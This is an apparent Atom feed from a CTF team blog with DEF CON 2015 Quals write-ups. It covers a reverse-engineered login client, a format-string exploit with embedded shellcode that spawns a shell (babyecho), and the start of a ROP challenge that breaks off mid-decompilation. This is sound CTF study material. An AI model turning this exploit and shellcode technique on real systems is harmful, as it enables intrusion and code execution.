<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-05-20T00:44:41+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Access Control Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/"/>
    <updated>2015-05-19T00:52:48+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/19/defconctf-2015-quals-access-control-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 Access-Control Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Reverse</strong></p>

<p>TL;DR</p>

<p>we are given a binary which seems to be a client to access a server.</p>

<!--more-->


<p>you can see my solution here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import socket 
</span><span class='line'>import telnetlib
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>s = socket.create_connection(("access_control_server_f380fcad6e9b2cdb3c73c651824222dc.quals.shallweplayaga.me", 17069))
</span><span class='line'>
</span><span class='line'>cid =  s.recv(1024).split(" ")[2]
</span><span class='line'>#cid = "H\"Y1)3IY+yEl\\3\n"
</span><span class='line'>print cid , len(cid)
</span><span class='line'>s80 = ord(cid[7])
</span><span class='line'>print chr(s80)
</span><span class='line'>s80 = s80 % 3
</span><span class='line'>#s80 = 0
</span><span class='line'>dst = cid[s80+1:s80+1+5]
</span><span class='line'>print dst
</span><span class='line'>p = "duchess" #grumpy
</span><span class='line'>passw = ""
</span><span class='line'>
</span><span class='line'>for i in range(5):
</span><span class='line'>    passw += chr(ord(p[i]) ^ ord(dst[i]))
</span><span class='line'>passw = list(passw)
</span><span class='line'>print passw
</span><span class='line'>for i in range(5):
</span><span class='line'>    if ord(passw[i]) &lt;= 0x1f:
</span><span class='line'>        passw[i] = chr(ord(passw[i]) + ord(' '))
</span><span class='line'>    if ord(passw[i]) == 0x7f:
</span><span class='line'>        passw[i] = chr(ord(passw[i]) - 0x7E + 0x20)
</span><span class='line'>
</span><span class='line'>passw = ''.join(passw)
</span><span class='line'>print passw
</span><span class='line'>print s.recv(1024)
</span><span class='line'>#print s.recv(1024)
</span><span class='line'>s.send("version 3.11.54\n")
</span><span class='line'>print s.recv(1024)
</span><span class='line'>s.send("duchess\n")
</span><span class='line'>print s.recv(1024)
</span><span class='line'>s.send(passw+"\n")
</span><span class='line'>print s.recv(1024)
</span><span class='line'>
</span><span class='line'>s.send("print key\n")
</span><span class='line'>print s.recv(1024)
</span><span class='line'>chall = s.recv(1024)
</span><span class='line'>print chall
</span><span class='line'>chall = chall.split(" ")[1]
</span><span class='line'>print chall
</span><span class='line'>#print s.recv(1024)
</span><span class='line'>
</span><span class='line'># compute answer on chall
</span><span class='line'>
</span><span class='line'>dst = cid[s80+7:s80+7+5]
</span><span class='line'>print dst
</span><span class='line'>passw = ""
</span><span class='line'>
</span><span class='line'>for i in range(5):
</span><span class='line'>    passw += chr(ord(chall[i]) ^ ord(dst[i]))
</span><span class='line'>passw = list(passw)
</span><span class='line'>print passw
</span><span class='line'>for i in range(5):
</span><span class='line'>    if ord(passw[i]) &lt;= 0x1f:
</span><span class='line'>        passw[i] = chr(ord(passw[i]) + ord(' '))
</span><span class='line'>    if ord(passw[i]) == 0x7f:
</span><span class='line'>        passw[i] = chr(ord(passw[i]) - 0x7E + 0x20)
</span><span class='line'>
</span><span class='line'>passw = ''.join(passw)
</span><span class='line'>print passw, len(passw)
</span><span class='line'>
</span><span class='line'>s.send(passw+"\n")
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>t = telnetlib.Telnet()
</span><span class='line'>t.sock = s
</span><span class='line'>t.interact()
</span></code></pre></td></tr></table></div></figure>


<p>Running the script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python access-sol.py
</span><span class='line'>XZI_}jT.'l@Km+
</span><span class='line'>[..]
</span><span class='line'>
</span><span class='line'>the key is: The only easy day was yesterday. 44564
</span><span class='line'>
</span><span class='line'>hello duchess, what would you like to do?</span></code></pre></td></tr></table></div></figure>


<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babyecho Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/"/>
    <updated>2015-05-18T21:45:44+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycho Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<blockquote><p>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
</span><span class='line'>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
</span><span class='line'>$ checksec.sh --file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</span></code></pre></td></tr></table></div></figure>


<p>First try got my attention:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
</span><span class='line'>Reading 13 bytes
</span><span class='line'>%p%p%p%p
</span><span class='line'>0xd0xa(nil)0xd
</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>


<p>There is format string vulnerability, and based on binary properties we should run our shellcode.</p>

<!--more-->


<p>but there&rsquo;s a limit, 13 bytes? right?</p>

<p>time to take a look at binary in IDA, the main function is <code>sub_8048F3C</code>.
some resolving symbols the function looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int sub_8048F3C()
</span><span class='line'>{
</span><span class='line'>  signed int v0; // eax@2
</span><span class='line'>  int v3; // [sp+10h] [bp-410h]@1
</span><span class='line'>  int v4; // [sp+1Ch] [bp-404h]@4
</span><span class='line'>  int v5; // [sp+41Ch] [bp-4h]@1
</span><span class='line'>
</span><span class='line'>  v5 = *MK_FP(__GS__, 20);
</span><span class='line'>  v3 = 13;
</span><span class='line'>  setvbuf((int)off_80EA4C0, 0, 2, 0);
</span><span class='line'>  signal(14, (int)sub_8048EB1);
</span><span class='line'>  alarm(10);
</span><span class='line'>  while ( 1 )
</span><span class='line'>  {
</span><span class='line'>    v0 = 1023;
</span><span class='line'>    if ( v3 &lt;= 1023 )
</span><span class='line'>      v0 = v3;
</span><span class='line'>    v3 = v0;
</span><span class='line'>    printf("Reading %d bytes\n", v0);
</span><span class='line'>    reado((int)&v4, v3, 10);
</span><span class='line'>    filter_n((int)&v4);
</span><span class='line'>    printf((const char *)&v4);
</span><span class='line'>    alarm(10);
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>the <code>filter_n</code> function just checks for <code>%n</code> and filters it as <code>_n</code>.</p>

<p>if i overwrite <code>v0</code> i can send my shellcode and return to it.</p>

<p>i just need to know the offset, and gdb says it is 7:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
</span><span class='line'>%p%p%p%p
</span><span class='line'>[-------------------------------------registers--------------------------------------]
</span><span class='line'>EAX: 0xffffc86c ("%p%p%p%p")
</span><span class='line'>EBX: 0x80481a8 (push   ebx)
</span><span class='line'>ECX: 0x0 
</span><span class='line'>EDX: 0xffffffff 
</span><span class='line'>ESI: 0x0 
</span><span class='line'>EDI: 0x80ea00c --&gt; 0x80660a0 (mov    edx,DWORD PTR [esp+0x4])
</span><span class='line'>EBP: 0xffffcc78 --&gt; 0x80497d0 (push   ebx)
</span><span class='line'>ESP: 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
</span><span class='line'>EIP: 0x804900f (call   0x804f560)
</span><span class='line'>[----------------------------------------code----------------------------------------]
</span><span class='line'>   0x8049003:   call   0x8048ecf
</span><span class='line'>   0x8049008:   lea    eax,[esp+0x1c]
</span><span class='line'>   0x804900c:   mov    DWORD PTR [esp],eax
</span><span class='line'>=&gt; 0x804900f:   call   0x804f560
</span><span class='line'>   0x8049014:   mov    DWORD PTR [esp],0xa
</span><span class='line'>   0x804901b:   call   0x804fde0
</span><span class='line'>   0x8049020:   mov    DWORD PTR [esp],0x14
</span><span class='line'>   0x8049027:   call   0x806cb50
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg[0]: 0xffffc86c ("%p%p%p%p")
</span><span class='line'>[---------------------------------------stack----------------------------------------]
</span><span class='line'>00:0000| esp 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
</span><span class='line'>01:0004|     0xffffc854 --&gt; 0xd (b'\r')
</span><span class='line'>02:0008|     0xffffc858 --&gt; 0xa (b'\n')
</span><span class='line'>03:0012|     0xffffc85c --&gt; 0x0 
</span><span class='line'>04:0016|     0xffffc860 --&gt; 0xd (b'\r')
</span><span class='line'>05:0020|     0xffffc864 --&gt; 0xffffc86c ("%p%p%p%p")
</span><span class='line'>06:0024|     0xffffc868 --&gt; 0x0 
</span><span class='line'>07:0028| eax 0xffffc86c ("%p%p%p%p")
</span><span class='line'>[------------------------------------------------------------------------------------]
</span><span class='line'>Legend: stack, code, data, heap, rodata, value
</span><span class='line'>
</span><span class='line'>Breakpoint 2, 0x0804900f in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Obviously, first i should leak the stack address at offset 5, then overwrite the <code>v0</code> so i send my shellcode, but the main part is how to break the loop. for this i just overwrite return address of <code>printf</code> and then jump to my shellcode.</p>

<p>TL;DR
Please check my implementation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
</span><span class='line'>
</span><span class='line'>import socket
</span><span class='line'>import struct
</span><span class='line'>import telnetlib
</span><span class='line'>
</span><span class='line'>def readuntil(f, delim='\n'):
</span><span class='line'>    data = ''
</span><span class='line'>    while not data.endswith(delim):
</span><span class='line'>        c = f.read(1)
</span><span class='line'>        assert len(c) &gt; 0
</span><span class='line'>        data += c
</span><span class='line'>    #print data
</span><span class='line'>    return data
</span><span class='line'>
</span><span class='line'>def p(v):
</span><span class='line'>    return struct.pack('&lt;I', v)
</span><span class='line'>
</span><span class='line'>def u(v):
</span><span class='line'>    return struct.unpack('&lt;I', v)[0]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#s = socket.create_connection(("127.0.0.1", 1337))
</span><span class='line'>s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
</span><span class='line'>f = s.makefile('rw', bufsize=0)
</span><span class='line'>
</span><span class='line'>raw_input("$") # attach debugger
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>shellcode = (
</span><span class='line'>"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
</span><span class='line'>          "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
</span><span class='line'>                  "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
</span><span class='line'>        )
</span><span class='line'>
</span><span class='line'>readuntil(f)
</span><span class='line'>f.write("%p"*5+"\n")
</span><span class='line'>loc =  int(readuntil(f)[:-1].split("0x")[-1], 16)  - 0x0c
</span><span class='line'>
</span><span class='line'>readuntil(f)
</span><span class='line'>f.write(p(loc)+"%30u%7$n\n")
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>readuntil(f)
</span><span class='line'>f.write(p(loc)+"%1200u%7$n\n")
</span><span class='line'>
</span><span class='line'>readuntil(f)
</span><span class='line'>
</span><span class='line'>wrl = loc+100 & 0xffff
</span><span class='line'>wrh = (loc+100 &gt;&gt; 16 ) & 0xffff
</span><span class='line'>
</span><span class='line'>print hex(wrl), hex(wrh)
</span><span class='line'>
</span><span class='line'>payload = p(loc-0x14)+"%0{i}c".format(i=wrl)+"%0007$hn"+"%0{i}c".format(i=(wrh-wrl-8))+p(loc-0x12)+"%0014$hn"+p(loc-0x12)+"A"*48+shellcode+"A"*(1024 - 48 - len(shellcode))+"\n"
</span><span class='line'>print payload
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>f.write(payload)
</span><span class='line'>
</span><span class='line'>print "[+] shell is ready: "
</span><span class='line'>t = telnetlib.Telnet()
</span><span class='line'>t.sock = s
</span><span class='line'>t.interact()</span></code></pre></td></tr></table></div></figure>


<p>there you go:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python babyecho-expl.py
</span><span class='line'>0x4a24 0xffd2
</span><span class='line'>�I��%018980c%0007$hn%046502c
</span><span class='line'>[...]
</span><span class='line'>cat /home/babyecho/flag 
</span><span class='line'>The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - ROPBaby Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/"/>
    <updated>2015-05-18T21:16:42+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 ROPBaby Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<p>As the challenge name proved we should use ROP technique to read flag from the server ( or pop a shell ).</p>

<blockquote><p>r0pbaby_542ee6516410709a1421141501f03760</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./r0pbaby_542ee6516410709a1421141501f03760 
</span><span class='line'>
</span><span class='line'>&lt;!--more--&gt;
</span><span class='line'>
</span><span class='line'>Welcome to an easy Return Oriented Programming challenge...
</span><span class='line'>Menu:
</span><span class='line'>1) Get libc address
</span><span class='line'>2) Get address of a libc function
</span><span class='line'>3) Nom nom r0p buffer to stack
</span><span class='line'>4) Exit
</span><span class='line'>: 1
</span><span class='line'>libc.so.6: 0x00007FF0352429B0
</span><span class='line'>1) Get libc address
</span><span class='line'>2) Get address of a libc function
</span><span class='line'>3) Nom nom r0p buffer to stack
</span><span class='line'>4) Exit
</span><span class='line'>: 2
</span><span class='line'>Enter symbol: system
</span><span class='line'>Symbol system: 0x00007FF034A9DC40
</span><span class='line'>1) Get libc address
</span><span class='line'>2) Get address of a libc function
</span><span class='line'>3) Nom nom r0p buffer to stack
</span><span class='line'>4) Exit
</span><span class='line'>: 
</span></code></pre></td></tr></table></div></figure>


<p>So we have address of any symbols of the <code>libc.so.6</code>.</p>

<p>Let&rsquo;s check the binary in IDA, the main function is <code>sub_C46</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>__int64 sub_C46()
</span><span class='line'>{
</span><span class='line'>  __int64 v0; // rax@2
</span><span class='line'>  signed int v1; // eax@4
</span><span class='line'>  __int64 v2; // rax@12
</span><span class='line'>  unsigned __int64 v3; // r14@15
</span><span class='line'>  int v4; // er13@17
</span><span class='line'>  size_t v5; // r12@17
</span><span class='line'>  int v6; // eax@18
</span><span class='line'>  void *handle; // [sp+8h] [bp-448h]@1
</span><span class='line'>  char nptr[1088]; // [sp+10h] [bp-440h]@2
</span><span class='line'>  __int64 savedregs; // [sp+450h] [bp+0h]@22
</span><span class='line'>
</span><span class='line'>  setvbuf(stdout, 0LL, 2, 0LL);
</span><span class='line'>  signal(14, handler);
</span><span class='line'>  puts("\nWelcome to an easy Return Oriented Programming challenge...");
</span><span class='line'>  puts("Menu:");
</span><span class='line'>  handle = dlopen("libc.so.6", 1);
</span><span class='line'>  while ( 1 )
</span><span class='line'>  {
</span><span class='line'>    while ( 1 )
</span><span class='line'>    {
</span><span class='line'>      while ( 1 )
</span><span class='line'>      {
</span><span class='line'>        while ( 1 )
</span><span class='line'>        {
</span><span class='line'>          sub_BF7();
</span><span class='line'>          LODWORD(v0) = sub_B9A(nptr, 1024LL);
</span><span class='line'>          if ( !v0 )
</span><span class='line'>          {
</span><span class='line'>            puts("Bad choice.");
</span><span class='line'>            return 0LL;
</span><span class='line'>          }
</span><span class='line'>          v1 = strtol(nptr, 0LL, 10);
</span><span class='line'>          if ( v1 != 2 )
</span><span class='line'>            break;
</span><span class='line'>          __printf_chk(1LL, "Enter symbol: ");
</span><span class='line'>          LODWORD(v2) = sub_B9A(nptr, 64LL);
</span><span class='line'>          if ( v2 )
</span><span class='line'>          {
</span><span class='line'>            dlsym(handle, nptr);
</span><span class='line'>            __printf_chk(1LL, "Symbol %s: 0x%016llX\n");
</span><span class='line'>          }
</span><span class='line'>          else
</span><span class='line'>          {
</span><span class='line'>            puts("Bad symbol.");
</span><span class='line'>          }
</span><span class='line'>        }
</span><span class='line'>        if ( v1 &gt; 2 )
</span><span class='line'>          break;
</span><span class='line'>        if ( v1 != 1 )
</span><span class='line'>          goto LABEL_24;
</span><span class='line'>        __printf_chk(1LL, "libc.so.6: 0x%016llX\n");
</span><span class='line'>      }
</span><span class='line'>      if ( v1 != 3 )
</span><span class='line'>        break;
</span><span class='line'>      __printf_chk(1LL, "Enter bytes to send (max 1024): ");
</span><span class='line'>      sub_B9A(nptr, 1024LL);
</span><span class='line'>      v3 = (signed int)strtol(nptr, 0LL, 10);
</span><span class='line'>      if ( v3 - 1 &gt; 0x3FF )
</span><span class='line'>      {
</span><span class='line'>        puts("Invalid amount.");
</span><span class='line'>      }
</span><span class='line'>      else
</span><span class='line'>      {
</span><span class='line'>        if ( v3 )
</span><span class='line'>        {
</span><span class='line'>          v4 = 0;
</span><span class='line'>          v5 = 0LL;
</span><span class='line'>          while ( 1 )
</span><span class='line'>          {
</span><span class='line'>            v6 = _IO_getc(stdin);
</span><span class='line'>            if ( v6 == -1 )
</span><span class='line'>              break;
</span><span class='line'>            nptr[v5] = v6;
</span><span class='line'>            ++v4;
</span><span class='line'>            v5 = v4;
</span><span class='line'>            if ( v3 &lt;= v4 )
</span><span class='line'>              goto LABEL_22;
</span><span class='line'>          }
</span><span class='line'>          v5 = v4 + 1;
</span><span class='line'>        }
</span><span class='line'>        else
</span><span class='line'>        {
</span><span class='line'>          v5 = 0LL;
</span><span class='line'>        }
</span><span class='line'>LABEL_22:
</span><span class='line'>        memcpy(&savedregs, nptr, v5);
</span><span class='line'>      }
</span><span class='line'>    }
</span><span class='line'>    if ( v1 == 4 )
</span><span class='line'>      break;
</span><span class='line'>LABEL_24:
</span><span class='line'>    puts("Bad choice.");
</span><span class='line'>  }
